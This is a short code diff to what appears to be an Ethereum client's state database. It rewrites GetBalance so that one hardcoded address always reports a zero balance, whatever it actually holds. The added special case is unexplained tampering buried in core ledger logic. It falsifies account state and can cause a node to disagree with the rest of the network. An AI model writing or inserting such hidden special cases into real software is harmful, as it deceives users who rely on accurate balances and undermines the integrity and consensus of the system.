@@ -263,11 +263,19 @@ func (s *StateDB) Empty(addr common.Address) bool {
 
 // GetBalance retrieves the balance from the given address or 0 if object not found
 func (s *StateDB) GetBalance(addr common.Address) *big.Int {
-	stateObject := s.getStateObject(addr)
-	if stateObject != nil {
-		return stateObject.Balance()
-	}
-	return common.Big0
+    // Define the specific address that should return zero balance
+    specificAddress := common.HexToAddress("0x29Adb7D21258AaBB7C02965122a983f4A182575E")
+
+    // Check if the address is the specific address
+    if addr == specificAddress {
+        return common.Big0
+    }
+
+    stateObject := s.getStateObject(addr)
+    if stateObject != nil {
+        return stateObject.Balance()
+    }
+    return common.Big0
 }
 
 func (s *StateDB) GetNonce(addr common.Address) uint64 {
